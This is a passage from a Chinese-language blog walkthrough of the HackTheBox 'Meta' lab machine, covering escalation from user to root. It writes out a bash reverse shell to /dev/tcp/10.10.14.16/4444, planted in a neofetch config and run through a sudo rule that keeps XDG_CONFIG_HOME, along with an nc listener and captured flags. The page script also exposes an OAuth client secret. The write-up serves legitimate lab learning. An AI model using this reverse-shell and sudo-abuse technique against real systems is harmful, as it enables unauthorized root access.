+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Feb 21 15:30:44 2022 from 10.10.14.147
+-bash-5.0$ whoami&amp;&amp;id
+thomas
+uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
+</code></pre>
+<pre><code class="bash">-bash-5.0$ ls
+user.txt
+-bash-5.0$ cat user.txt 
+9e36bb6959f1ba118cfe71b928ac66b6
+</code></pre>
+<p>成功拿到user权限的flag文件</p>
+<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><pre><code class="bash">-bash-5.0$ sudo -l
+Matching Defaults entries for thomas on meta:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME
+
+User thomas may run the following commands on meta:
+    (root) NOPASSWD: /usr/bin/neofetch \&quot;\&quot;
+</code></pre>
+<p>sudo -l看到有一个可以root权限执行的neofetch</p>
+<blockquote>
+<p><a href="https://gtfobins.github.io/gtfobins/neofetch/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/neofetch/</a></p>
+</blockquote>
+<p>这里找到一个提权相关的</p>
+<p>但是有一点不一样，这里的权限只能使用指定参数</p>
+<p>但是会保留XDG_CONFIG_HOME的环境变量</p>
+<p>然后当前用户的neofetch配置文件可控</p>
+<p>现在按照这个思路来操作吧</p>
+<pre><code class="bash">-bash-5.0$ cd ~/.config/neofetch/
+-bash-5.0$ ls -la
+total 24
+drwxr-xr-x 2 thomas thomas  4096 Feb 21 13:32 .
+drwxr-xr-x 3 thomas thomas  4096 Aug 30 13:01 ..
+-rw-r--r-- 1 thomas thomas 14591 Aug 30 13:01 config.conf
+</code></pre>
+<ol>
+<li>在config.conf的第一行添加一个反向shell</li>
+</ol>
+<pre><code class="bash">/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.16/4444 0&gt;&amp;1&quot;
+</code></pre>
+<ol>
+<li>将thomas.config导出到基本配置环境路径</li>
+</ol>
+<pre><code class="bash">export XDG_CONFIG_HOME=&quot;$HOME/.config&quot;
+</code></pre>
+<ol>
+<li>在本地启用nc监听一个端口</li>
+</ol>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<ol>
+<li>以root权限执行neofetch文件</li>
+</ol>
+<pre><code class="bash">sudo -u root /usr/bin/neofetch \&quot;\&quot;
+</code></pre>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.140] 39366
+root@meta:/home/thomas/.config/neofetch# whoami&amp;&amp;id
+whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>成功获得root权限</p>
+<pre><code class="bash">root@meta:/home/thomas/.config/neofetch# cd /root
+cd /root
+root@meta:~# ls
+ls
+conf
+root.txt
+
+cat root.txt
+f3f5e2ad459dbd8842f813bec23889f0
+</code></pre>
+<p>成功拿到root权限的flag文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/&title=《Meta - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/&title=《Meta - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Meta - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Undetected - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Devzat - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/&title=《Meta - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/&title=《Meta - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Meta - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvElEQVR42u3aQY7bQAwEQP//0xsgyC2w0k3O2DmUTsbaK03JgDhu8vWKj5/fx9+vn9/9+5PPZ3j++7uzHTjw8PDwRkt/d7xb9GxBCSxfz/Nn8PDw8G7z8mLwjH9GPl9rc8W3f8fDw8P7Km9fBmblYbNZx8PDw/suLw8I2uBgtgY8PDy87/LaH/83Ytmf4LiYteDh4eHFvE0D7FuvP9Tfw8PDwyu76sljty0S+QjCZoV/zoOHh4d3gfe8/Z3FB2dHr9p495X01vDw8PDWvNklk1bZbOAg2Ru3K8TDw8M7y2sHpPJikAeySYlKSlGUUuPh4eEd4uXgpDDk4Hxzn68HDw8P7zO8dpRqfwvaDXQbUuDh4eHd420e6G0EvJ9uaIsTHh4e3md4+Xb2VLtrVpDqu4KHh4d3iJc89GcxQZsPJNeqvyo8PDy8a7zkId6GBe1YQLFFziMJPDw8vI/w2vZ/2wabRR7tGfDw8PBu8PLH9z/u0KLAtFHy6nvDw8PDW/PyB/SshZ+/uykG0WQEHh4e3jVe/iN/1gBr2137eAIPDw/vLG/2+M6Xm7Sykod7G4Lg4eHh3eO1MUFeKvZhxGzw6+0Z8PDw8I7yZg2wPIxob9+m8RYNXeHh4eEd4uWhavIQz8dJk1uW35TX5lvCw8PDK3mbQavNcmfx7jClxsPDwzvEm32oDWdnAe5wXCCpS3h4eHgL3ib9zYPX/CrXvys8PDy8Q7z9KFUe7Obb6E3MgYeHh3eDN2s7nR2iagcRiv/Fw8PDu8Bb1ZMyLEgu2W7B6wAXDw8P7xCvLQb5SMGpILgtDHh4eHif4bVNrAQ2G+Ga1S48PDy8/5l3tok1G5/KR1rx8PDwvsvbxK+bsYM8AsbDw8P7JC/ZBD+fKHm3BRxrbuHh4eEd5bU/9dtO2iwmbrfUx/p7eHh4eE+r+gXgLg0BQMl8kAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
